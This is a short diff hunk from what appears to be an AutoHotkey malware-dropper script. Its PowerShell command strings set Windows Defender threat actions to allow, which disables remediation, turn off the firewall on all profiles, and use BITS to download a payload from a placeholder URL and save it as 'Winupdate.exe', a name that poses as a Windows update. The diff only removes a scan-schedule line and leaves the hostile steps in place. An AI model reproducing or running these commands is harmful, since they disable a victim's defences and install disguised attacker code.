@@ -32,7 +32,6 @@ j:="powershell.exe -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force
 k:="powershell.exe -command ""Set-MpPreference -ModerateThreatDefaultAction 6""`n"
 l:="powershell.exe -command ""Set-MpPreference -LowThreatDefaultAction 6""`n"
 m:="powershell.exe -command ""Set-MpPreference -SevereThreatDefaultAction 6""`n"
-n:="powershell.exe -command ""Set-MpPreference -ScanScheduleDay 8""`n"
 o:="powershell.exe -command ""netsh advfirewall set allprofiles state off""`n"
 ff:="powershell -command start-bitstransfer https://directurl-to-your-payload  .\Winupdate.exe `n"
 gg:="timeout 3 `n"
